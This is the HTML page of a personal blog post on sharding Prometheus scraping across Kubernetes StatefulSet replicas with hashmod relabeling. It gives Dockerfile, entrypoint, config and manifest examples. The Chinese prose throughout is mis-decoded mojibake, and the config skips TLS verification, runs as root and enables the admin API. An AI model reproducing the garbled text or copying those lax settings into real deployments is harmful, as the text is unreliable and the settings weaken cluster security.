<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Grideaé™æ€ä¸ªäººåšå®¢">
<meta name="description" content="æ¸©æ•…è€ŒçŸ¥æ–°">
<meta name="theme-color" content="#000">
<title>ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦» | Amend</title>
<link rel="shortcut icon" href="/favicon.ico?v=1618212030871">
<link rel="stylesheet" href="/media/css/mist.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">

<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>





  <meta name="description" content="ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦»" />
  <meta name="keywords" content="" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="mist">
  <header class="header bg-color ">
    <div class="blog-header box-shadow-wrapper  " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="">
              <span class="logo-line-before">
                <i class=""></i>
              </span>
              <span class="main-title">Amend</span>
              <span class="logo-line-after">
                <i class=""></i>
              </span>
            </a>  
          
        </div>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> é¦–é¡µ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> å½’æ¡£
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> æ ‡ç­¾
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/post/about/" target="_self">
                  <i class="fa fa-user"></i> å…³äº
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> å‹æƒ…é“¾æ¥
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">æœç´¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout mist bg-color">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper  right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">æ–‡ç« ç›®å½•</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">ç«™ç‚¹æ¦‚è§ˆ</span>
          </div>
        </div>
      
      <div class="sidebar-body mist" id="sidebar_body">
        
          
            <div class="post-side-meta" id="post_side_meta">
              
<div class="sidebar-wrapper box-shadow-wrapper ">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">è®°å½•æŠ€æœ¯é’»ç ”çš„è¿‡ç¨‹å’Œç»“æœåˆ†äº«ã€ä¹Ÿå¸Œæœ›å¯ä»¥å¸®åŠ©è‡ªå·±ä½œä¸ºç¬”è®°è®°å½•</p>
    
    <div class="site-description right-motion">
      
      
      
        <p>ä¸€ä¸ªæ™®æ™®é€šé€šçš„è¿ç»´er</p>
      
      
    </div>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">8</span>
        <span class="site-item-stat-name language" data-lan="article">æ–‡ç« </span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">4</span>
        <span class="site-item-stat-name language" data-lan="category">åˆ†ç±»</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">4</span>
        <span class="site-item-stat-name language" data-lan="tag">æ ‡ç­¾</span>
      </a>
    </div>
  </div>
  
  



</div>
            </div>
            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number auto"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li><a href="#%E8%90%BD%E7%9B%98%E8%AE%BE%E8%AE%A1">è½ç›˜è®¾è®¡ï¼š</a></li>
<li><a href="#%E9%92%88%E5%AF%B9%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB">é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»</a>
<ul>
<li><a href="#%E6%9E%B6%E6%9E%84%E7%AD%96%E7%95%A5">æ¶æ„ç­–ç•¥</a></li>
<li><a href="#%E9%80%BB%E8%BE%91">é€»è¾‘</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BB%A5k8s%E9%83%A8%E7%BD%B2%E4%B8%BA%E4%BE%8B">æ­¥éª¤(ä»¥K8Séƒ¨ç½²ä¸ºä¾‹)</a></li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // ä¿å­˜liå…ƒç´ 
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // å¤„ç†ä¸æ˜¯ä»#ä¸€çº§æ ‡é¢˜å¼€å§‹ç›®å½•
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    window.Velocity(hideElement, 'stop');
    window.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        window.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://amendge.github.io/post/shi-jian-prometheus-ri-jian-zeng-chang-de-nei-cun-ru-he-zuo-hash-fen-chi/">
      ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦»
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2020-12-18 14:32:32">2020-12-18</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>5<span class="language" data-lan="minute">åˆ†é’Ÿ</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>1007<span class="pc-show language" data-lan="words">å­—æ•°</span></span>
    </span>
    
    
    
    <span id="/post/shi-jian-prometheus-ri-jian-zeng-chang-de-nei-cun-ru-he-zuo-hash-fen-chi/" data-flag-title="ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦»" class="meta-item pc-show leancloud_visitors">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-eye"></i>
      <span><span class="language" data-lan="view">æµè§ˆé‡</span>ï¼š<span class="leancloud-visitors-count"></span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <p>Prometheuså”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯ç›‘æ§é¡¹è¶Šæ¥è¶Šå¤šçš„æƒ…å†µä¸‹,å†…å­˜æ¶ˆè€—æ˜¯å¾ˆå¤§çš„,å¦‚æœæ ¹æ®æŒ‡æ ‡é¡¹è¿›è¡Œæœé›†åˆ†å‰²ï¼Ÿ</p>
<!-- more -->
<h1 id="è½ç›˜è®¾è®¡">è½ç›˜è®¾è®¡ï¼š</h1>
<p>Prometheusåœ¨æ•°æ®è½ç›˜çš„æµç¨‹ä¸Šè¿›è¡Œäº†ä¸€å®šçš„è€ƒè™‘ã€‚<br>
å®Œæ•´çš„æ•°æ®æµç¨‹åº”è¯¥æ˜¯:pull-&gt;prometheus-&gt;memory-&gt;wal-&gt;tsdb-&gt;filesystem.<br>
æ­£å¸¸çš„æƒ…å†µä¸‹ï¼ŒPrometheusä¼šæŠŠæœ€æ–°æœé›†åˆ°çš„æ•°æ®æ”¾åœ¨å†…å­˜ä¸­ï¼Œé’ˆå¯¹æœé›†é‡è¾ƒå¤§ï¼Œmetricså†…åŒ…å«è¾ƒå¤§ã€è¾ƒå¤šlabelçš„å’Œç›‘æ§é¡¹ time seriesè¾ƒå¤šçš„ç›‘æ§æŒ‡æ ‡æ¥è¯´å­˜åœ¨å†…å­˜é‡Œæ˜¯ä¸å¤ªå‹å¥½çš„ï¼Œä¼šå ç”¨è¾ƒé«˜çš„å†…å­˜ä½¿ç”¨ï¼ŒåŒæ—¶å†…å­˜é‡Œé¢ä¹Ÿä¼šå­˜å‚¨ç›¸å¯¹è¾ƒè€è¿˜æ²¡æœ‰è½ç›˜çš„æ•°æ®ã€‚ä»¥t0-t1ä¸ºæœ€æ–°æ—¶é—´ï¼Œt1-t2ä¸ºè¾ƒè€æ—¶é—´ï¼Œt3,t4... å†…å­˜ä¸­: (t0-t1çš„series+t1-t2çš„series)<br>
<img src="https://amendge.github.io/post-images/1617867267806.png" alt="" loading="lazy"></p>
<p>é‚£ä¹ˆå¸¦æ¥çš„é—®é¢˜å°±æ¥äº†ï¼š<br>
1.å¦‚æœPrometheusé‡å¯æ€ä¹ˆåŠï¼Ÿ<br>
å¦‚æœPrometheusé‡å¯çš„è¯ï¼ŒPrometheusæœ¬åœ°ä¼šæœ‰ç¼“å­˜æ–‡ä»¶WALå­˜å‚¨è¿˜æœªè½ç›˜çš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´ä¸ä¼šé€ æˆå¤§é‡çš„æ•°æ®ä¸¢å¤±ï¼Œä½†æ˜¯åœ¨ä¸€å®šçš„æ•°æ®é‡ä¸‹ï¼ŒPrometheusé‡å¯ä¼šè¿›è¡ŒWALæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼ŒåŠ è½½è¿‡ç¨‹ä¼šé€ æˆ1-2ä¸ªæ‹‰å–é—´éš”çš„æ•°æ®ä¸¢å¤±ï¼Œå‡ºç°æ–­å±‚ã€‚åŒæ—¶æ ¹æ®æ•°æ®é‡å¤§å°ä¸åŒï¼ŒåŠ è½½æ—¶é—´ä¹Ÿä¼šä¸ä¸€æ ·<br>
2.å¦‚æœæŸ¥è¯¢æ›´åŠ ä¹…è¿œçš„æ•°æ®æ€ä¹ˆåŠï¼Ÿ<br>
Prometheuså¯¹äºæ›´åŠ ä¹…è¿œçš„æ•°æ®æŸ¥è¯¢æ–¹å¼æ˜¯ä»filesystem-&gt;tsdb-&gt;Memoryçš„æ–¹å¼,å¦‚æœå¯¹äºä¸€äº›time seriesè¾ƒå¤šçš„æŒ‡æ ‡æ¥è¯´ï¼Œå‹åŠ›æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæ­¤æ—¶å†…å­˜ä¸­(æŸ¥è¯¢çš„time series+æ–°æ‹‰å–çš„time series),æ‰€æœ‰ä¼šå‘ç°æ ¹æ®æŸ¥è¯¢æ•°æ®é‡çš„ä¸åŒå†…å­˜ä¼šæœ‰ä¸åŒç¨‹åº¦çš„ä¸Šå‡ï¼Œå¾ˆå¤§çš„å¯èƒ½æ’‘çˆ†å†…å­˜è¿›è¡Œé‡å¯ã€‚<br>
3.å¦‚æœè½ç›˜+å†…å­˜ä¸è¶³æ€ä¹ˆåŠ<br>
å¦‚æœå¯¹äºæ–°æ‹‰å–æ•°æ®æ¥ä¸åŠè½ç›˜å°±ä¼šè¿›è¡Œé‡å¯ã€OOMç­‰ï¼Œé‚£è¿™ä¸ªæ—¶å€™æœ‰å¿…è¦æ‰©å¤§å†…å­˜æˆ–è€…è¿›è¡Œåˆ†ç¦»äº†</p>
<h1 id="é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»">é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»</h1>
<h2 id="æ¶æ„ç­–ç•¥">æ¶æ„ç­–ç•¥</h2>
<figure data-type="image" tabindex="1"><img src="https://amendge.github.io/post-images/1617867218714.png" alt="" loading="lazy"></figure>
<h2 id="é€»è¾‘">é€»è¾‘</h2>
<p>1.å°†æ‰€æœ‰è¦æ‹‰èµ·çš„targetç­‰ä¿¡æ¯æ‰“å¥½æ ‡ç­¾æ³¨å†Œåˆ°consul<br>
2.Prometheusé€šè¿‡hashmodæ–¹å¼åˆ†å—æ‹‰å–consulé…ç½®<br>
3.æ¯ä¸ªå•ç‹¬Prometheuséƒ½ä¼šæ‹‰å–ä¸åŒäºå…¶ä»–çš„é…ç½®<br>
4.æœ€å¥½å¯¹æ¯ä¸ªå•ç‹¬çš„Prometheusåšæ•°æ®æ±‡æ€»æˆ–è€…æŸ¥è¯¢æ±‡æ€»</p>
<h2 id="æ­¥éª¤ä»¥k8séƒ¨ç½²ä¸ºä¾‹">æ­¥éª¤(ä»¥K8Séƒ¨ç½²ä¸ºä¾‹)</h2>
<p>1.é’ˆå¯¹å®˜æ–¹çš„é•œåƒæ–°å¢hashmodæ¨¡å—åˆ†é…å€¼<br>
Dockerfile:</p>
<pre><code>FROM  prometheus/prometheus:2.20.0
MAINTAINER name gecailong

COPY ./entrypoint.sh /bin

ENTRYPOINT [&quot;/bin/entrypoint.sh&quot;]
</code></pre>
<pre><code>entrypoint.shï¼š

#!/bin/sh

ID=${POD_NAME##*-}

cp /etc/prometheus/prometheus.yml /prometheus/prometheus-hash.yml

sed -i &quot;s/ID_NUM/$ID/g&quot; /prometheus/prometheus-hash.yml

/bin/prometheus --config.file=/prometheus/prometheus-hash.yml --query.max-concurrency=20 --storage.tsdb.path=/prometheus --storage.tsdb.max-block-duration=2h --storage.tsdb.min-block-duration=2h  --storage.tsdb.retention=2h --web.listen-address=:9090 --web.enable-lifecycle --web.enable-admin-api
</code></pre>
<p><strong>IDNUMï¼š ä¸ºæˆ‘ä»¬åé¢é…ç½®åšå‡†å¤‡</strong><br>
2.Prometheuséƒ¨ç½²<br>
Prometheusé…ç½®æ–‡ä»¶:</p>
<pre><code>  prometheus.yml: |
    global:
      scrape_interval:     15s
      evaluation_interval: 15s

      external_labels:
         monitor: 'k8s-sh-prod'
         service: 'k8s-all'
         ID: 'ID_NUM'
         ...
</code></pre>
<p>è¿™ä¸ªIDæ˜¯ä¸ºäº†æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å¯ä»¥åŒºåˆ†åŒæ—¶ä¹Ÿå¯ä»¥ä½œä¸ºç­‰ä¸‹hashmodæ¨¡å—çš„å¯¹åº”å€¼</p>
<p>ä»¥æ‹‰å–Nodeä¿¡æ¯ä¸ºä¾‹:</p>
<pre><code>    - job_name: 'kubernetes-nodes'
      kubernetes_sd_configs:
      - role: node
      scheme: https
      tls_config:
        insecure_skip_verify: true
      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
      relabel_configs:
      - action: labelmap
        regex: __meta_kubernetes_node_label_(.+)
      - source_labels: [__meta_kubernetes_node_address_InternalIP]
        regex: (.+)
        target_label: __address__
        replacement: ${1}:10250 
      - source_labels: [__meta_kubernetes_node_name]
        regex: (.+)
        target_label: __metrics_path__
        replacement: /metrics
        #ä»¥ä¸‹ä¸ºhashmodé…ç½®éƒ¨åˆ†
      - source_labels: [__meta_kubernetes_node_name]
        modulus:       10   #è¦åˆ†æˆçš„æ¨¡å—æ€»æ•°
        target_label:  __tmp_hash
        action:        hashmod
      - source_labels: [__tmp_hash]
        regex:         ID_NUM  #å½“å‰æ‰€å±æ¨¡å—æ•°
        action:        keep
</code></pre>
<p>éƒ¨ç½²æ–‡ä»¶:</p>
<pre><code>apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: prometheus
  name: prometheus-sts
  namespace: monitoring
spec:
  serviceName: &quot;prometheus&quot;
  replicas: 10   #hashmodæ€»æ¨¡å—æ•°
  selector:
    matchLabels:
      app: prometheus
  template:
    metadata:
      labels:
        app: prometheus
    spec:
      containers:
      - image: prometheus:2.20.0-hash
        name: prometheus
        securityContext:
           runAsUser: 0
        command:
        - &quot;/bin/entrypoint.sh&quot;  #hashmodè„šæœ¬æ‰§è¡Œ
        env:
        - name: POD_NAME   #æ ¹æ®statefulsetçš„ç‰¹æ€§ä¼ å…¥PODåç§°ç”¨äºæ¨¡å—å–å€¼
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: metadata.name
        ports:
        - name: http
          containerPort: 9090
          protocol: TCP
</code></pre>
<p>é’ˆå¯¹æ•°æ®å­˜å‚¨å’ŒæŸ¥è¯¢çš„é—®é¢˜å¯ä»¥é€šè¿‡Thanosè¿›è¡ŒæŸ¥è¯¢èšåˆï¼Œä¹Ÿå¯ä»¥é€šè¿‡victoriametricsè¿›è¡Œæ•°æ®å­˜å‚¨çš„èšåˆåœ¨grafanaç•Œé¢è¿›è¡Œç»Ÿä¸€çš„æŸ¥è¯¢</p>
<p>é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»</p>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">æœ¬æ–‡ä½œè€…ï¼š</strong>
      è®°å½•æŠ€æœ¯é’»ç ”çš„è¿‡ç¨‹å’Œç»“æœåˆ†äº«ã€ä¹Ÿå¸Œæœ›å¯ä»¥å¸®åŠ©è‡ªå·±ä½œä¸ºç¬”è®°è®°å½•
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="https://amendge.github.io/post/shi-jian-prometheus-ri-jian-zeng-chang-de-nei-cun-ru-he-zuo-hash-fen-chi/" title="ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦»">https://amendge.github.io/post/shi-jian-prometheus-ri-jian-zeng-chang-de-nei-cun-ru-he-zuo-hash-fen-chi/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">ç‰ˆæƒå£°æ˜ï¼š </strong>
      æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
    </li>
  </ul>
  <div class="tags">
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="ã€ç›‘æ§ã€‘å‘Šè­¦èšåˆ|å‘Šè­¦å¬å›åŠŸèƒ½å®ç°" href="https://amendge.github.io/post/jian-kong-gao-jing-ju-he-orgao-jing-zhao-hui-gong-neng-shi-xian/">ã€ç›‘æ§ã€‘å‘Šè­¦èšåˆ|å‘Šè­¦å¬å›åŠŸèƒ½å®ç°</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="ã€ç›‘æ§ã€‘å‘Šè­¦èšåˆ|å‘Šè­¦å¬å›åŠŸèƒ½å®ç°" href="https://amendge.github.io/post/jian-kong-gao-jing-ju-he-orgao-jing-zhao-hui-gong-neng-shi-xian/">ä¸Šä¸€ç¯‡</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="å¦‚ä½•ç”¨åŸç”ŸPrometheusç›‘æ§å¤§è§„æ¨¡Kubernetesé›†ç¾¤" href="https://amendge.github.io/post/ru-he-yong-yuan-sheng-prometheus-jian-kong-da-gui-mo-kubernetes-ji-qun/">å¦‚ä½•ç”¨åŸç”ŸPrometheusç›‘æ§å¤§è§„æ¨¡Kubernetesé›†ç¾¤</a>
        <a class="nav-mobile-next" title="å¦‚ä½•ç”¨åŸç”ŸPrometheusç›‘æ§å¤§è§„æ¨¡Kubernetesé›†ç¾¤" href="https://amendge.github.io/post/ru-he-yong-yuan-sheng-prometheus-jian-kong-da-gui-mo-kubernetes-ji-qun/">ä¸‹ä¸€ç¯‡</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | Â© 2019-2020 Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      Powered by <a href="https://github.com/amendge" target="_blank">Amend</a>
    </div>
  </footer>
  
  
  <div class="drawer-box left" id="drawer_box">
    <span class="muse-line muse-line-first"></span>
    <span class="muse-line muse-line-middle"></span>
    <span class="muse-line muse-line-last"></span>
  </div>
  
  <div class="mist back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
